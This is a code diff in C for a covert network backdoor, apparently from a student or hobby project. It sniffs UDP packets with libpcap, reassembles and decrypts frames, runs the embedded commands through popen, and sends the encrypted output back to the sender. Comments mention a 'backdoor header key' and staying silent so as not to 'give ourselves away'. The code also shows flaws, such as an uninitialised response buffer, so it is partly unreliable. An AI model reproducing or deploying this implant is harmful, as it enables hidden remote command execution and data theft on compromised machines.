@@ -14,7 +14,6 @@
 #include "ntp.h"
 #include "inet.h"
 
-#define ETHER_IP_UDP_LEN 44
 #define SRC_OFF 		28 // Source address, so we know where to send results
 #define PORT_OFF 		38 // Destination port, we'll reflect results back on the same port
 
@@ -68,29 +67,38 @@ void pkt_handler(u_char *user, const struct pcap_pkthdr *pkt_info, const u_char 
 {
 	char *ptr;
 	char *data;
+	char *dec;
 	char type;
 	int duplex = (int) user;
-	uint32 ip;
-	short port;
-	int len;
+	static char buf[MAX_LEN];
+	static int len = 0;
 
-	/* Step 1: locate the payload portion of the packet */
-	ptr = (char *)(packet + ETHER_IP_UDP_LEN);
+	// Step 1: locate the payload portion of the packet
 	if (pkt_info->caplen - ETHER_IP_UDP_LEN <= 0)
-		return;
+			return;
+	ptr = (char *)(packet + ETHER_IP_UDP_LEN);
 
-	/* Step 2: check payload for backdoor header key
-	if (0 != memcmp(ptr, HDR_KEY, hdr_len))
-		return; */
+	// Step 2: check for signature
 
-	len = pkt_info->caplen - ETHER_IP_UDP_LEN;
+	// Step 3: dump data into buffer
+//	dec = decrypt(SEKRET, ptr, FRAM_SZ);
+	data = buf + len;
+	memcpy(data, ptr, FRAM_SZ);
+//	free(dec);
 
-	data = getTransmission(ptr, &len, &type);
+	len += pkt_info->caplen - ETHER_IP_UDP_LEN;
+
+	// Step 4: see if we have a full transmission
+	data = getTransmission(buf, &len, &type);
 	if (data == NULL)
 		return;
 
+	// Step 5: execute the command
 	if (type == CMD_TYP)
 	{
+		uint32 ip;
+		short port;
+
 		// Grab the source in case we need to send the result back
 		ip = *(uint32*)(packet + SRC_OFF);
 		port = *(uint16*)(packet + PORT_OFF);
@@ -98,16 +106,20 @@ void pkt_handler(u_char *user, const struct pcap_pkthdr *pkt_info, const u_char 
 		// Step 6: Execute the command
 		execute(data, ip, port, duplex);
 	}
+
+	// Step 6: reset buffer
+	memset(buf, 0, MAX_LEN);
+	len = 0;
 }
 
 void execute(char *command, u_int32_t ip, u_int16_t port, int duplex)
 {
 	FILE *fp;
-	char out[MAX_LEN];
+	char line[MAX_LEN];
+	char resp[MAX_LEN];
 	int sock = 0;
 	struct sockaddr_in saddr;
-	char buff[MAX_LEN];
-	char * enc = *buff;
+	int tot_len;
 
 	// Run the command, grab stdout
 	fp = popen(command, "r");
@@ -125,24 +137,39 @@ void execute(char *command, u_int32_t ip, u_int16_t port, int duplex)
 			perror("socket");
 	}
 
-	// Read output line by line
-	while (fgets(out, MAX_LEN -1, fp) != NULL)
+	// Append line by line output into response buffer
+	while (fgets(line, MAX_LEN, fp) != NULL)
+		strcat(resp, line);
+
+	tot_len = strlen(resp) + 1;
+
+	if (duplex)
 	{
-		if (duplex)
+		char *trans;
+
+		trans = buildTransmission(resp, &tot_len, RSP_TYP);
+
+		for (int i = 0; i < tot_len; i += 8)
 		{
-			int len = strlen(out);
-			
-			enc = encrypt(PASSKEY, out, len);
+			char frame[FRAM_SZ];
+			char *enc;
+			char *ptr;
+			int fram_len;
 
-			enc = buildTransmission(enc, &len, RSP_TYP);
+			ptr = resp + i;
 
-			sendto(sock, enc, len, 0, (struct sockaddr *)&saddr, sizeof(saddr));
+			fram_len = (tot_len - i > 8) ? FRAM_SZ : tot_len - i;
+
+			memcpy(frame, ptr, fram_len);
+
+			enc = encrypt(SEKRET, frame, FRAM_SZ);
+
+			sendto(sock, enc, FRAM_SZ, 0, (struct sockaddr *)&saddr, sizeof(saddr));
 
 			free(enc);
 		}
-		else
-			; //Do nothing so we don't give ourselves away.
-			//printf("%s", out);
+
+		free(trans);
 	}
 
 	pclose(fp);
